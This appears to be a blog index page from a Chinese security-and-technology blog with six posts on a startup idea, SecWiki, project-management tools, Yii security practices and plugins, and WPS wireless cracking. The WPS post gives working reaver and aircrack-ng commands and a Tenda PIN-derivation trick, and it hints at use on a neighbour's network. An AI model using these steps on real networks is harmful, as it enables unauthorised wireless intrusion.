@@ -1,0 +1,665 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Ourren</title>
+  <meta name="author" content="ourren">
+
+  
+  <meta name="description" content="前几天跟一个创业的年轻人聊天，无意中谈到了他正在做的创业项目，其它他当时也只是描述一种模式：生活在中我们经常在小卖部或者店铺直接购买商品，这种购买方式不同于网络购物（后者可以在支付宝或者京东或者腾讯上积分，然后用积分换取RMB），他们想做的就是让用户在现金购物的时候进行积分，从而实现线下积分。 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://blog.ourren.com/blog/posts/5/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Ourren" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.useso.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.useso.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.useso.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Ourren</a></h1>
+  
+    <h2>关注技术，记录生活.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="blog.ourren.com/blog">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+    <li><a href="/">Home</a></li>
+    <li><a href="http://www.ourren.com">Ourren</a></li>
+    <li><a href="http://www.sec-wiki.com">SecWiki</a></li>
+    <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2014/08/31/two_questions_about_o2o_point/">线下积分联盟的十问十答</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-08-31T00:00:00-07:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>31</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2014/08/31/two_questions_about_o2o_point/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><img class="aligncenter" src="http://ourren.b0.upaiyun.com/o2ojifen.jpg" alt="" width="512" height="219"></p>
+
+<p>前几天跟一个创业的年轻人聊天，无意中谈到了他正在做的<strong>创业项目</strong>，其它他当时也只是描述一种模式：生活在中我们经常在小卖部或者店铺直接购买商品，这种购买方式不同于网络购物（后者可以在支付宝或者京东或者腾讯上积分，然后用积分换取RMB），他们想做的就是让用户在现金购物的时候进行积分，从而实现线下积分。但是我感觉用六个字就可以概括：<strong>线下积分联盟</strong>。</p>
+
+<p>他们初步提出的<strong>解决方案</strong>：组成团队开发APP和网站，用户和商家在进行交易时，可以直接通过APP进行交易（可通过支付宝或者其它支付方式）或者通过现金交易后在APP上登记积分。最终用户可以把线下的所有购物金额进行积分，从而可以通过积分换取商品。</p>
+
+<p>在我听了以上的模式后，同时结合自己在互联网的一些认识提出了如下的问题：</p>
+
+<ol>
+<li>其实前几年针对这类应用就有“pupa优惠券&#8221;，相对于这类应用有啥优势？目前是否有该类系统或者网站？</li>
+</ol>
+
+
+<p>2.双方还需要安装APP，同时交易完成后还需要打开APP进行积分统计，用户体验能再差点不？</p>
+
+<p>3.为什么不直接基于支付宝或者微信进行插件开发，因为这些平台用户量大，基本上手机上都安装有，再说用户使用的时候也感觉方便？</p>
+
+<p>4.生活中用现金支付的地方一般都是小门面，买个水买包面啥的，还得搞个APP麻烦不？再说目前这些门面一般还没WIFI，虽然目前3G4G很流行，但是从我观察看好多人还是2G，因为网络制式的问题。</p>
+
+<p>5.如果仅仅针对小商店怎么盈利，毕竟成立公司创业还是得考虑项目的盈利点？如果仅仅是拉拢用户等风投，估计前期就可能直接死在沙滩上。</p>
+
+<p>6.大商场或者商家目前都有自家的微信公众号，用户扫描关注后就可以购物积分，并且还可以通过微信钱包进行支付，再说目前支付宝在推线下支付（雷达，声波支付都已经形成产品）。这种用户体验是不是更好？大商家也不会采用你这种联盟方式。</p>
+
+<p>7.其实说到联盟，信用卡和银联卡才是可以直接做线下积分联盟的大厂商，特别是目前信用卡积分可以换里程，换礼物。同时还经常搞活动。你这种模式是不是直接掉在信用卡的后面？</p>
+
+<p>8.如何去说服商家来使用你这种服务？你能给小店铺带来什么？流量或者人群？从目前的描述看基本上都没有，因此商家不会卖你的帐，基本上不会使用你的功能。</p>
+
+<p>9.现有的记账软件基本上可以涵盖日常生活的消费，是不是可以把你的想法跟这个结合起来？</p>
+
+<p>10.目前的微信公众号对商家的相关业务已经延伸得很广，不光是积分，还有用户管理或者产品销售统计等功能，已经在这块应用上领先了，可以在公众号上做出一些产品可能还有市场。</p>
+
+<p>其实综合如上的问题，我个人在日常中针对创业项目的思考主要从如下几个方面考虑：</p>
+
+<p>1.团队成员。再好的项目放在一堆团队管理混乱，成员各自怀有二心的，那么这个项目肯定会失败。好的创业项目肯定得有各类人员：管理者、技术、运营这些人才，只有大家相互达成共识，并认定大家会成功才能成功度过危机关头。</p>
+
+<p>2.盈利模式。 这个是最重要的，一个创业项目没有明确的盈利模式那么必然会走向失败，或许可以在前期积累用户，然后在后期推出其它相关盈利项目。</p>
+
+<p>3.产品优势。相对于目前已有的相关产品，是否有自己的核心技术或者固定客户，如果只是一些普通的别人可以复制的东西，那么肯定在快速发展期会遇到很多问题。</p>
+
+<p>4.产品的易用性。产品是否符合人们的使用习惯，是否真正地找到了用户的痛点。</p>
+
+<p>5.团队头脑风暴。团队人员多做一些即时讨论，方便大家思维碰撞。</p>
+
+<p>BTW. 以上纯属自己的一些想法和看下，欢迎探讨。</p>
+
+<p> </p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2014/06/15/secwiki_morning_news/">SecWiki:安全从业者的晨报</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-06-15T00:00:00-07:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2014/06/15/secwiki_morning_news/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><img class="aligncenter" src="http://ourren.b0.upaiyun.com/secwiki2.jpg" alt="" width="875" height="478"></p>
+
+<h3>SecWiki的初衷</h3>
+
+
+<p>一句话：为了更好地为安全爱好者服务。 作为从事安全行业的相关技术人员，每天上班、下班都非常的辛苦，除了为公司创造应有的价值外，自身为了未来更好的发展每天不得不阅读大量的行业资讯。但是目前由于互联网发展速度之猛，行业波及面之广，让我们每天生活充满了众多的噪声（例如微博、微信和QQ），我们不得不从一页有一页的资料中翻阅对自己有用的技术资讯和安全新闻，这样让我们很累。 因此，SecWiki的推出就是为了解决这些问题：帮助安全人员每天用最短的时间找到今日最新、最核心的行业新闻和技术资讯。从SecWiki的第一版到第二版我们都围绕着这个思想来做网站，当然在这个过程中也感谢很多朋友对网站提出了很多有用的建议。</p>
+
+<h3>SecWiki的现状</h3>
+
+
+<p>从2012年7月16日到现在，我们共收集并推荐了3808条技术资讯、48条安全事件、45个技术专题汇总、62个聚合链接、14期SecWiki周刊、7个漏洞、1个在线分析工具。 全站技术主要涵盖了Ｗeb安全、系统安全、恶意/漏洞分析、移动安全、设备安全、网络安全、运维安全、数据挖掘和编程技术。类型主要涉及文章、文档、视频等，每篇文章都有标准的标签属性，基本上涵盖了安全领域的相关技术。 但是目前网站的内容大部分内容基本上都由我提交，同时也有一些乐于分享的Hu0G4、secniu、Debug0、smarabbit等等一大批小伙伴们，在这里没办法一一列出，望见谅。</p>
+
+<h3>SecWiki快速提交</h3>
+
+
+<p>写到这里，小编自己确实有些过意不去：虽然给广大安全人员搭建提供了一个平台，但是对于一般用户而言，在提交新链接方面的操纵确实复杂，用户体验确实不好，但是SecWiki确实有一种快速提交当前网页的工具，但是一直没有用文章的方式进行介绍，借这个机会给大家分享以下：</p>
+
+<p><embed width="480" height="400" type="application/x-shockwave-flash" src="http://static.video.qq.com/TPout.swf?vid=t0130a1idfy&auto=0" allowfullscreen="allowfullscreen" quality="high" align="middle" allowscriptaccess="always"></embed></p>
+
+<h3>SecWiki的愿望</h3>
+
+
+<p>SecＷiki希望能有更多的分享者参与到项目计划中来，只有这样网站才能持续地良性发展。当然，作为分享者你也能够从中获益，主要有如下几个方面：</p>
+
+<ol>
+    <li>让自己养成善于阅读资讯的习惯，第一时间掌握安全圈的动态；</li>
+    <li>将随时看到的文章保存在SecWiki上，方便以后导出。（目前因为版权方面因素，SecWiki没有缓存文章原文内容，抱歉）；</li>
+    <li>让你和你的昵称在安全圈有一定的认识度，认识更多的圈内朋友；</li>
+    <li>想想每天你提交的链接有很多安全人员都在阅读，这绝对是一件非常有意义的事。</li>
+</ol>
+
+
+<p>如何任何问题欢迎留言或者<span style="color: #000000;">微博： <a style="color: #cccccc;" href="http://t.qq.com/secwiki" target="_blank"><span style="color: #000000;">@腾讯微博</span></a> <a style="color: #cccccc;" href="http://weibo.com/secwiki" target="_blank"><span style="color: #000000;">@新浪微博</span></a></span><br style="color: #a4a1a1;"><span style="color: #000000;">意见反馈QQ群：295202941</span><br style="color: #a4a1a1;"><span style="color: #000000;">联系邮件：<a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#83;&#x65;&#x63;&#x57;&#105;&#x6b;&#x69;&#64;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#83;&#101;&#x63;&#87;&#x69;&#107;&#105;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;</a></span></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2014/04/05/project-management-system/">关于项目管理系统的一些讨论</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-04-05T00:00:00-07:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>5</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2014/04/05/project-management-system/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h3><img class="aligncenter" alt="project-management-system" src="http://ourren.b0.upaiyun.com/project-management-system.jpg" width="484" height="260"></h3>
+
+
+<h3>需求讨论</h3>
+
+
+<p>假设你身为一个团队的技术管理人员，在团队建立初期，你的人员或者事物相对比较少，你可以直接通过当面通知或者QQ群进行任务的派发；但是当一个团队人员增长过快并且事(项目+杂事)特别多的时候，你的生活可能就会出现混乱：boss随时在催你项目进度情况，不清楚团队人员一天在做什么，不知道团队人员一周干了什么事情。</p>
+
+<p>或许你需要的只是个人的todo工具，在这次我隆重推荐doit.im(基于GTD理论的时间管理工具)，但这不是我这篇文章的重点内容，我感觉一个团队的管理不仅仅是一个todo工具，跟更需要对项目的可控和可检测。</p>
+
+<p>正是由于这样的需求，在对互联网上的免费项目管理系统（在线+离线）进行了搜索和分析，在此做一个总结，希望此文章能对与正在寻找项目管理系统的你有所帮助。</p>
+
+<h3>在线与离线</h3>
+
+
+<p>当代互联网有几个概念很火：”云计算&#8221;，&#8221;大数据“，”O2O“等，当然各个行业都基于这些很火的概念创造出了很多新颖的东西，比如安全领域的云空间、在线WAF、在线日志分析、各种盾、还有基于大数据的APT检测，更火的还是O2O带动了整个移动平台的高速发展。</p>
+
+<p>当然，项目管理领域自然也不例外，将项目管理与云计算、移动化办公等结合起来，推出了各种在线的项目管理平台，各种优势都体现出来了，但是在线系统虽然在一定程度上消灭离线项目管理系统，但是无法得到全球普及。首先，只有初创团队或者互联网公司才会跟随时代的步伐，使用最先进的技术产品（online项目管理系统），一般的技术团队对该类产品感受不到其优点；其次，在线系统无法保证团队项目的信息和资料的安全性，诚然很多公司都会阐述我公司的系统采用了阿里云的主机，每周有安全测试人员对系统进行黑盒测试，但是你不能说明用户的数据是绝对安全的。</p>
+
+<p>在此，总计下在线/离线项目管理系统的特点：</p>
+
+<pre><code>在线系统：方便、快捷、功能更新快，但用户数据的安全有待研究，适合于小型初创团队；
+离线系统：隐私保护较好，功能较弱，用户体验不好，但方便自我搭建和维护，适合于对安全性要求较高的团队。</code></pre>
+
+
+<h3>在线系统</h3>
+
+
+<p>经过我最近对该类项目管理系统的研究，推荐几个做得很好的系统，在线的推荐worktile，离线的推荐WSS（纯属于个人喜好问题）。大伙可以根据自己的需求进行选择，有啥需要讨论的欢迎留言：</p>
+
+<ul>
+    <li>国外：Basecamp、JIRA、Trello</li>
+    <li>国内：tower、teambition、Fengche、worktile</li>
+</ul>
+
+
+<h3>离线系统</h3>
+
+
+<ul>
+    <li>国外：redmine</li>
+    <li>国内：禅道、WSS、TeamToy</li>
+</ul>
+
+
+<p>worktile的布局和风格比较适合我个人，同时其功能也满足团队的研发需求，另外WSS相对与禅道而言相对简单很多，并且PHP开源程序，方便修改。禅道虽然其功能相当细致，但是其安全性有待进一步提高。</p>
+
+<p>总体而言，先理清自己是否需要注重安全问题，如果这个方面需求比较高，那还是用离线版搭建在自己的内网中吧，否则就还是用在线服务吧，不折腾可移动办公。PS：个人用户的话还是用好Todo类软件吧，好好管理好自己的时间。</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2014/03/15/yii_security_problems/">YII开发需要注意的安全问题</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-03-15T00:00:00-07:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2014/03/15/yii_security_problems/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h3><img class="aligncenter" alt="yii_security" src="http://ourren.b0.upaiyun.com/yii_security.jpg" width="585" height="314"></h3>
+
+
+<h3 id="_1">前沿</h3>
+
+
+<p>接触YII开发已经有一些日子了，虽然YII把MVC的思想在PHP语言上发挥得淋漓尽致，但是在实际的YII开发中稍不注意还是会引起很多安全问题，本文主要对YII开发中需要注意的安全问题进行总结，方便后来开发者对此引起重视。</p>
+
+<h3 id="1">1.越权攻击</h3>
+
+
+<p>越权攻击可能跟MVC架构相关，YII虽然提供了基于RBAC的接口，同时auth插件将RBAC理念直接图形化操作，但是在实际的编程中使用基于RBAC认证的应用可能不是很多，因此直接采用系统默认的accessControl可能就会存在一些问题，例如在修改和删除操作的时候，如果采用系统默认的判定是无法实现业余系统的功能的，因为在更新或者删除的时候需要对所有权进行判定（即：该条数据是否属于当前用户），一般可以采用如下的规则进行判定：</p>
+
+<pre><code>$currentid = Yii::app()->user->getId();
+if($model->uid === $currentid)
+{
+    //do something after auth
+} 
+else
+{
+    throw new CHttpException(400,'not allow');
+}
+</code></pre>
+
+
+<h3 id="2">2.注入攻击</h3>
+
+
+<p>目前框架类语言在防止注入攻击方面做得还是不错的，一般主要按照框架提供数据库类进行操纵即可，YII框架在数据方面的操作也不例外，在插入、更新、删除、查询方面YII封装了很多类和函数，操作数据库的时候建议直接采用这些函数即可，不要用拼接字符串进行操作，例如，查询是经常遇到的操作，一般都是采用CDbCriteria类添加条件并查询：</p>
+
+<pre><code>//compare createtime
+$criteria = new CDbCriteria;
+$criteria->addCondition('createtime>:btime');
+$criteria->params[':btime'] = $btime;
+
+$criteria->addCondition('createtime<:etime');
+$criteria->params[':etime'] = $etime;
+$criteria->order = 'id desc';
+$retarr = XXX::model()->findAll($criteria);
+</code></pre>
+
+
+<h3 id="3">3.跨站请求伪造攻击</h3>
+
+
+<p>针对跨站请求伪造攻击CSRF攻击，YII直接提供了配置中全局进行CSRF防御，具体操作是在config/main.php中设置：</p>
+
+<pre><code>'components'=>array(
+    'request'=>array(
+        'enableCsrfValidation'=>true,
+    ),
+),
+</code></pre>
+
+
+<h3 id="4">4.跨站攻击防御</h3>
+
+
+<p>跨站攻击主要针对客户端浏览器这块，YII在跨站方面方面主要有以下几种处理办法。</p>
+
+<ul>
+    <li>httponly</li>
+</ul>
+
+
+<p>XSS跨站攻击主要针对盗取cookie或者通过XSS进行CSRF或者钓鱼攻击，先通过设置httponly可以在一定程度上降低XSS攻击，具体设置办法在config/main.php中设置：</p>
+
+<pre><code>//csrf cookie httponly
+'request'=>array(
+    'enableCsrfValidation' => true,
+    'enableCookieValidation'=>true,
+    'csrfCookie'=>array(
+            'httpOnly'=>true,
+    ),
+),
+//session httonly
+'session' => array(
+        'cookieParams' => array(
+                'httponly' => true,
+        ),
+),
+</code></pre>
+
+
+<ul>
+    <li>编码/转义</li>
+</ul>
+
+
+<p>针对用户需要在特定情况下输入数据，而这些数据是用户可以通过输入可以控制的数据。这时需要对该类数据进行编码处理，否则容易引起跨站攻击，一般主要有两种处理方法： 1.针对简单的文本处理 可以直接采用CHtml类的encode函数进行处理，该函数采用HTML编码方法对数据进行编码(即会对&#8221;&lt;&ldquo;,&rdquo;>&ldquo;,&lsquo;&rdquo;&rsquo;,&ldquo;&amp;&rdquo;,&ldquo; &rdquo;. etc).</p>
+
+<pre><code>CHtml::encode($var);
+</code></pre>
+
+
+<p>2.针对富文本处理 在富文本情况下，处理相对比较复杂，主要可以通过YII提供的widget进行处理，实际处理代码如下：</p>
+
+<pre><code><?php 
+    $this->beginWidget('CHtmlPurifier');
+    echo $model->something; 
+    $this->endWidget();
+ ?>
+</code></pre>
+
+
+<blockquote>需要注意的问题，需要php开启：php-dom 或者php-xml。例如centos可以运行如下命令：</blockquote>
+
+
+<pre><code>yum install php-dom
+</code></pre>
+
+
+<h3 id="reference">Reference</h3>
+
+
+<ul>
+    <li><a href="http://www.yiiframework.com/doc/guide/1.1/zh_cn/topics.security">安全措施 (Security)</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2014/02/08/yii_bootstrap/">基于Bootstrap的YII插件汇总</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-02-08T00:00:00-08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>8</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2014/02/08/yii_bootstrap/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><img class="aligncenter" alt="yii_bootstrap" src="http://ourren.b0.upaiyun.com/yii_boostrap.jpg" width="603" height="197"></p>
+
+<p>YII作为当前流行的PHP框架，可以快速地开发网站和应用；而bootstrap作为twitter开源的响应式布局解决方案，可以在不了解CSS和JavaScript脚本的基础上实现网页的布局和网站设计。YII+Bootstrap两者结合起来可以说是加速了网站开发进度，让开发人员只需关注网站的功能。</p>
+
+<p>从<a href="http://www.yiiframework.com/extensions/" target="_blank">yiiframework</a>官方网站可以看到很多YII插件，当前少不了基于bootstrap的插件，个人从开始接触yii和bootstrap也差不多一年多了，在这里推荐下几个常用的基于bootstrap的yii插件。</p>
+
+<p><strong>     <a href="http://www.cniska.net/yii-bootstrap/" target="_blank">yii-bootstrap</a></strong></p>
+
+<p>该插件出现时间最早，同时该作者还写了很多yii插件，比如强大的auth插件。yii-bootstrap插件将常用的bootstrap的布局进行了封装，将所有可能单独使用的元素写成了widgets小工具，开发人员只需要使用PHP语言即可写出比较完美的网站。</p>
+
+<p><strong>      <a href="http://yii-booster.clevertech.biz/" target="_blank">yiibooster</a></strong></p>
+
+<p>yiibooster在yii-bootstrap的基础上进行了二次开发，集成了更多的开源库，例如：jQuery、Highcharts JS等。</p>
+
+<p><strong>      <a href="http://www.getyiistrap.com/" target="_blank">yiistrap</a></strong></p>
+
+<p>yiistrap是最新的开源项目，跟前面两个开源库的使用有所不同，扩充性和易用性更好。</p>
+
+<p>这几个开源库的配置相对比较简单，对应的网站都有相应的入门教程。</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2013/11/07/wireless_security_wps/">无线安全之WPS</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-11-07T00:00:00-08:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2013/11/07/wireless_security_wps/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><img class="aligncenter" alt="wireless_attch_wps" src="http://ourren.b0.upaiyun.com/wireless_attach.jpg" width="500" height="302"></p>
+
+<p>最近在淘宝入手了一套8187芯片主板与14DB平板天线，用我的老爷笔记本做了下测试，结果测试效果还行，邻居的电信带宽速度也不错。</p>
+
+<p>具体涉及的无线安全技术：主要是扫描开放有WPS功能的无线路由器，然后通过开源软件reaver来暴力破解pin码，最后通过pin来得到无线路由器WPA-PSK密码。前面暴力破解时间稍微比较长，后面这个过程可以说是秒杀。</p>
+
+<h3>配置</h3>
+
+
+<p>基本配置就如下所示，出了笔记本电脑外其它就价格也就RMB120块左右。</p>
+
+<p><em>8187 芯片主板</em>
+<em>14DB平板天线</em>
+<em>3米 USB2.0延长线</em>
+<em>安装Linux 系统的笔记本</em></p>
+
+<p>话说14DB的平板天线看起来还是很霸气的，关于事事如意18DB天线也测试了下效果差不多，不知道是不是楼层的问题。</p>
+
+<h3>准备工作</h3>
+
+
+<p>安装驱动和工具(aircrack-ng和reaver)，Ubuntu可以直接APT，其它系统可以需要下载源码安装，不过都很简单。</p>
+
+<p><em>sudo apt-get install aircrack-ng </em>
+<em>sudo apt-get install reaver</em></p>
+
+<h3>破解过程</h3>
+
+
+<p>1、开启网卡的监控模式</p>
+
+<p>sudo airmon-ng start wlan0</p>
+
+<p>2、扫描附近的无线信号</p>
+
+<p>sudo airodump-ng mon0</p>
+
+<p>在这个过程中你会看到很多无线信号，主要观察几个参数 ：PWR(信号强度，越小越好)，MB(需要为54e.)。</p>
+
+<p>BSSID      PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+68:53:21:E3:30:BE  -1 0 0 0 143 -1 &lt;length: 0>
+BC:D1:77:25:76:84 -47 50 2 0 1 54e WPA2 CCMP PSK fire
+C8:3A:35:55:42:E8 -44 35 0 0 8 54e WPA CCMP PSK Tenda_5542E8
+1C:FA:68:1C:7D:D6 -56 30 0 0 6 54e. WPA2 CCMP PSK hool
+A8:15:4D:83:6A:24 -51 29 5 0 11 54e. WPA2 CCMP PSK show
+F4:EC:38:3D:02:B6 -53 19 0 0 1 54e. WPA2 CCMP PSK</p>
+
+<p>这里特别强调下Tenda路由器可以秒杀，其路由器的MAC前面地址为： C8:3A:35，后面6为是pin的前8位的十六进制。因此只需要复制MAC地址的后6位，然后转为十进制，就可以得到PIN码的前面的数字了。</p>
+
+<p>3、破解PIN码</p>
+
+<p>sudo reaver -i mon0 -b MAC -a -S -vv -d 0 -c 1</p>
+
+<p>知道PIN前面的数字的时候可以用下面这个命令：</p>
+
+<p>sudo reaver -i mon0 -b MAC -a -S -vv -d 0 -c 6 -p 40000</p>
+
+<p>-b 后面跟MAC地址</p>
+
+<p>-c 频道，从扫描结果看</p>
+
+<p>然后就开始破解了，等4个小时左右基本上可以搞定。</p>
+
+<p>附上reaver调整参数的一些小技巧</p>
+
+<p>reaver:</p>
+
+<p>-i 监听后接口名称</p>
+
+<p>-b 目标mac地址</p>
+
+<p>-a 自动检测目标AP最佳配置</p>
+
+<p>-S 使用最小的DH key（可以提高PJ速度）</p>
+
+<p>-vv 显示更多的非严重警告</p>
+
+<p>-d 即delay每穷举一次的闲置时间 预设为1秒</p>
+
+<p>-t 即timeout每次穷举等待反馈的最长时间</p>
+
+<p>-c 指定频道可以方便找到信号</p>
+
+<p> </p>
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/posts/6">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/posts/4">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+    <h1>分类目录</h1>
+    <ul>
+        <li>
+            <a href="http://blog.ourren.com/categories/life" title="life thing and think">生活</a>
+        </li>
+        <li><a href="http://blog.ourren.com/categories/research" title="do some research in daily life">研究</a>
+        </li>
+        <li><a href="http://blog.ourren.com/categories/security" title="all security articles">安全</a>
+        </li>
+        <li><a href="http://blog.ourren.com/categories/technology" title="all program and code">技术</a>
+        </li>
+    </ul>
+</section><section>
+    <h1>友情链接</h1>
+    <ul>
+        <li><a href="http://ohroot.com/" target="_blank">Direwolf</a></li>
+        <li><a href="http://www.insight-labs.org/">insight-labs</a></li>
+        <li><a href="http://lx.shellcodes.org/">lu4nx</a></li>
+        <li><a href="http://www.metasploit.cn/forum.php" title="Metasploit 中文站" target="_blank">Metasploit</a></li>
+        <li><a href="http://www.ourren.com/" target="_blank">ourren</a></li>
+    </ul>
+</section>
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - ourren -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
